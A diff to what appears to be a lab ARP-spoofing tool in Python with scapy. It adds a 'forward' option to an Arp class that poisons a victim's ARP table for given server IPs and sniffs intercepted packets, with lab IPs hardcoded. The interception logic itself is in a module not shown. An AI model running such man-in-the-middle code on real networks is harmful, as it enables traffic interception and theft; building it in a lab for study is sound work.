@@ -5,10 +5,11 @@ import interceptor
 
 
 class Arp():
-    def __init__(self, networkInterface, victimIP, spoofIP):
+    def __init__(self, networkInterface, victimIP, spoofIP, forward):
         self.networkInterface = networkInterface
         self.victimIP = victimIP
         self.spoofIP = spoofIP
+        self.forward = forward
         self.attackerMAC = get_if_hwaddr(networkInterface)
         self.victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
         self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]  # get array of MAC of poisoned ips in victim arp table
@@ -21,7 +22,7 @@ class Arp():
         sniff(prn=self.interceptLoud, iface=self.networkInterface, filter="ip", timeout = 20)
 
     def intercept(self, pkt):
-         interceptor.interceptARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface)
+         interceptor.interceptARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface, self.forward)
 
     def interceptLoud(self, pkt):
         interceptor.loudARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC,
@@ -47,6 +48,7 @@ victimIP = "192.168.56.101"
 
 spoofIP = "192.168.56.104"
 #serverMAC = "08:00:27:c6:a4:61"
+
 
 # test = Arp(networkInterface, [victimIP], [spoofIP])
 #
